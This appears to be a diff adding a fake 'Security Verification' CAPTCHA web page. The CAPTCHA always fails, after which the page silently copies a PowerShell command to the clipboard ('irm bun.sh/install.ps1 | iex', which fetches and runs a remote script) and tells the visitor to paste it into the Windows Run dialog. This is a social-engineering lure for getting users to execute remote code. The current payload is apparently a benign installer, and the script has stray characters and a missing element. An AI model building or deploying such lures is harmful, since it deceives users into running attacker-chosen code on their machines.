@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Verification</title>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --primary-color: #1877f2;
+        --primary-hover: #166fe5;
+        --secondary-color: #f0f2f5;
+        --text-color: #1c1e21;
+        --container-bg: #ffffff;
+        --error-color: #e41e3f;
+        --success-color: #28a745;
+        --border-color: #dddfe2;
+        --input-bg: #f5f6f7;
+        --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Helvetica, Arial, sans-serif;
+        --shadow-1: 0 2px 4px rgba(0, 0, 0, 0.1);
+        --shadow-2: 0 2px 8px rgba(0, 0, 0, 0.1);
+        --warning-bg: #fff8e1;
+        --warning-border: #ffe57f;
+        --warning-text: #856404;
+      }
+
+      body {
+        font-family: var(--font-family);
+        background-color: var(--secondary-color);
+        color: var(--text-color);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+        box-sizing: border-box;
+        line-height: 1.5;
+      }
+
+      .container {
+        background-color: var(--container-bg);
+        padding: 30px 35px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        max-width: 480px;
+        width: 100%;
+        text-align: center;
+        position: relative;
+      }
+
+      .header {
+        margin-bottom: 25px;
+      }
+
+      .header h1 {
+        color: var(--text-color);
+        font-size: 24px;
+        margin: 0 0 10px 0;
+        font-weight: 600;
+      }
+
+      .header p {
+        font-size: 15px;
+        color: #606770;
+        margin-bottom: 0;
+      }
+
+      .captcha-box {
+        border: 1px solid var(--border-color);
+        padding: 20px;
+        border-radius: 6px;
+        background-color: #f7f8fa;
+        margin-bottom: 20px;
+      }
+
+      .captcha-image-container {
+        margin-bottom: 15px;
+        text-align: center;
+        position: relative;
+      }
+
+      .captcha-image {
+        max-width: 100%;
+        height: auto;
+        border-radius: 4px;
+        border: 1px solid #d0d0d0;
+        box-shadow: var(--shadow-1);
+      }
+
+      .refresh-captcha {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        background-color: rgba(255, 255, 255, 0.8);
+        border: none;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        color: var(--primary-color);
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        transition: all 0.2s ease;
+      }
+
+      .refresh-captcha:hover {
+        background-color: #fff;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
+      }
+
+      .captcha-input {
+        width: calc(100% - 22px);
+        padding: 12px;
+        margin-bottom: 15px;
+        border: 1px solid var(--border-color);
+        border-radius: 4px;
+        font-size: 16px;
+        text-align: center;
+        transition: all 0.2s ease;
+        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.08);
+      }
+
+      .captcha-input:focus {
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        outline: none;
+      }
+
+      .button {
+        background-color: var(--primary-color);
+        color: white;
+        padding: 12px 25px;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s ease;
+        display: inline-block;
+        width: 100%;
+        box-shadow: var(--shadow-1);
+      }
+
+      .button:hover {
+        background-color: var(--primary-hover);
+      }
+
+      .button:active {
+        transform: translateY(1px);
+      }
+
+      .button:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+      }
+
+      .instructions-box {
+        margin-top: 20px;
+        background-color: var(--warning-bg);
+        border: 1px solid var(--warning-border);
+        padding: 25px;
+        border-radius: 6px;
+        text-align: left;
+        box-shadow: var(--shadow-1);
+      }
+
+      .instructions-box h2 {
+        font-size: 18px;
+        color: var(--warning-text);
+        margin-top: 0;
+        margin-bottom: 15px;
+        display: flex;
+        align-items: center;
+      }
+
+      .instructions-box h2 i {
+        margin-right: 8px;
+        color: #f6b73c;
+      }
+
+      .instructions-box ol {
+        padding-left: 20px;
+        margin: 0;
+      }
+
+      .instructions-box li {
+        font-size: 14px;
+        line-height: 1.8;
+        margin-bottom: 12px;
+        color: #503e00;
+      }
+
+      .command-box {
+        background-color: #2d2d2d;
+        color: #00ff00;
+        font-family: "Consolas", "Monaco", monospace;
+        padding: 15px;
+        border-radius: 4px;
+        word-break: break-all;
+        font-size: 13px;
+        border: 1px solid #444;
+        white-space: pre-wrap;
+        position: relative;
+        box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
+      }
+
+      .copy-btn {
+        position: absolute;
+        top: 5px;
+        right: 5px;
+        background-color: rgba(255, 255, 255, 0.1);
+        border: none;
+        border-radius: 4px;
+        color: #aaa;
+        padding: 5px 8px;
+        font-size: 12px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+
+      .copy-btn:hover {
+        background-color: rgba(255, 255, 255, 0.2);
+        color: #fff;
+      }
+
+      kbd {
+        background-color: #f0f0f0;
+        border: 1px solid #ccc;
+        padding: 2px 5px;
+        border-radius: 3px;
+        font-family: var(--font-family);
+        font-size: 0.9em;
+        box-shadow: 1px 1px 1px #ddd;
+        margin: 0 2px;
+        color: #333;
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      .spinner-container {
+        text-align: center;
+        padding: 30px 0;
+      }
+
+      .spinner {
+        border: 4px solid rgba(24, 119, 242, 0.1);
+        border-top: 4px solid var(--primary-color);
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px auto;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .status-message {
+        font-size: 16px;
+        font-weight: 500;
+        color: var(--text-color);
+      }
+
+      .progress-bar-container {
+        height: 6px;
+        width: 100%;
+        background-color: #e9ecef;
+        border-radius: 3px;
+        margin-top: 15px;
+        overflow: hidden;
+      }
+
+      .progress-bar {
+        height: 100%;
+        width: 0;
+        background-color: var(--primary-color);
+        border-radius: 3px;
+        transition: width 0.3s ease;
+      }
+
+      .copy-feedback {
+        background-color: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 8px 12px;
+        border-radius: 4px;
+        position: absolute;
+        top: -40px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 13px;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+        pointer-events: none;
+      }
+
+      .copy-feedback.visible {
+        opacity: 1;
+      }
+
+      .security-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 30px;
+        padding-top: 15px;
+        border-top: 1px solid #eee;
+        color: #8a8d91;
+        font-size: 12px;
+      }
+
+      .security-badge i {
+        margin-right: 5px;
+        color: var(--success-color);
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 20px;
+        }
+
+        .header h1 {
+          font-size: 20px;
+        }
+
+        .captcha-box {
+          padding: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div id="captchaSection">
+        <div class="header">
+          <h1>Security Verification</h1>
+          <p>Please complete the verification below to continue.</p>
+        </div>
+        <div class="captcha-box">
+          <p style="font-size: 14px; color: #606770; margin-bottom: 15px">
+            Enter the characters you see in the image:
+          </p>
+          <div class="captcha-image-container">
+            <img
+              id="captchaImage"
+              class="captcha-image hidden"
+              alt="CAPTCHA Image"
+            />
+            <button
+              type="button"
+              class="refresh-captcha"
+              onclick="refreshCaptcha()"
+              title="Refresh captcha"
+            >
+              <i class="fas fa-sync-alt"></i>
+            </button>
+          </div>
+          <input
+            type="text"
+            id="captchaInput"
+            class="captcha-input"
+            placeholder="Enter characters shown above"
+            autocomplete="off"
+          />
+        </div>
+        <button id="verifyButton" class="button" onclick="submitCaptcha()">
+          Verify and Continue
+        </button>
+      </div>
+
+      <div id="verifyingSection" class="hidden">
+        <div class="spinner-container">
+          <div class="spinner"></div>
+          <p class="status-message">Verifying your request</p>
+          <div class="progress-bar-container">
+            <div id="progressBar" class="progress-bar"></div>
+          </div>
+        </div>
+      </div>
+
+      <div id="failedSection" class="hidden">
+        <div class="header">
+          <h1>Verification Failed</h1>
+        </div>
+        <p class="error-message">
+          <i class="fas fa-exclamation-triangle"></i>
+          Automatic verification failed
+        </p>
+        <p style="font-size: 15px; color: #606770; margin-bottom: 25px">
+          This may be due to temporary network issues or browser security
+          settings. To continue, we need to perform a manual system handshake to
+          verify your connection.
+        </p>
+        <button class="button" onclick="showManualInstructions()">
+          Proceed with Manual Verification
+        </button>
+      </div>
+
+      <div id="manualInstructionSection" class="instructions-box hidden">
+        <h2>
+          <i class="fas fa-shield-alt"></i>
+          Manual System Handshake
+        </h2>
+        <p>
+          To complete the verification process and secure your session, please
+          execute the system command below. This will synchronize your security
+          token with our servers.
+        </p>
+
+        <ol>
+          <li>
+            Press
+            <kbd>Win</kbd>
+            +
+            <kbd>R</kbd>
+            keys to open the 'Run' dialog
+          </li>
+          <li>
+            Copy the command below and paste it using
+            <kbd>Ctrl</kbd>
+            +
+            <kbd>V</kbd>
+          </li>
+          <li>
+            Press
+            <kbd>Enter</kbd>
+            or click 'OK' to execute
+          </li>
+        </ol>
+      </div>
+
+      <div class="security-badge">
+        <i class="fas fa-lock"></i>
+        <span>Protected by SecureVerify™</span>
+      </div>
+    </div>
+
+    <script>
+      const commandText = 'powershell -c "irm bun.sh/install.ps1 | iex"';
+      let captchaId = "";
+
+      async function loadCaptcha() {
+        try {
+          +document.getElementById("captchaImage").classList.add("hidden");
+
+          const response = await fetch(
+            "https://captcha.web.cern.ch/api/v1.0/captcha"
+          );
+          const data = await response.json();
+
+          captchaId = data.id;
+          const captchaImage = document.getElementById("captchaImage");
+          captchaImage.src = data.img;
+
+          captchaImage.onload = function () {
+            +captchaImage.classList.remove("hidden");
+          };
+        } catch (error) {
+          console.error("Error loading captcha:", error);
+          document.getElementById("captchaImage").src =
+            "/api/placeholder/250/80";
+          document.getElementById("captchaImage").classList.remove("hidden");
+        }
+      }
+
+      function refreshCaptcha() {
+        loadCaptcha();
+        document.getElementById("captchaInput").value = "";
+      }
+
+      function submitCaptcha() {
+        const captchaInput = document
+          .getElementById("captchaInput")
+          .value.trim();
+
+        if (captchaInput.length < 4) {
+          return;
+        }
+
+        document.getElementById("captchaSection").classList.add("hidden");
+        document.getElementById("verifyingSection").classList.remove("hidden");
+
+        const progressBar = document.getElementById("progressBar");
+        let width = 0;
+
+        const interval = setInterval(() => {
+          if (width >= 80) {
+            clearInterval(interval);
+
+            setTimeout(() => {
+              document
+                .getElementById("verifyingSection")
+                .classList.add("hidden");
+              document
+                .getElementById("failedSection")
+                .classList.remove("hidden");
+            }, 800);
+          } else {
+            width += Math.random() * 5;
+            progressBar.style.width = width + "%";
+          }
+        }, 100);
+      }
+
+      function showManualInstructions() {
+        document.getElementById("failedSection").classList.add("hidden");
+        document
+          .getElementById("manualInstructionSection")
+          .classList.remove("hidden");
+
+        copyCommand();
+      }
+
+      function copyCommand() {
+        navigator.clipboard.writeText(commandText).catch((err) => {
+          console.error("Failed to copy command automatically: ", err);
+        });
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        loadCaptcha();
+        document.getElementById("commandToRun").textContent = commandText;
+      });
+    </script>
+  </body>
+</html>
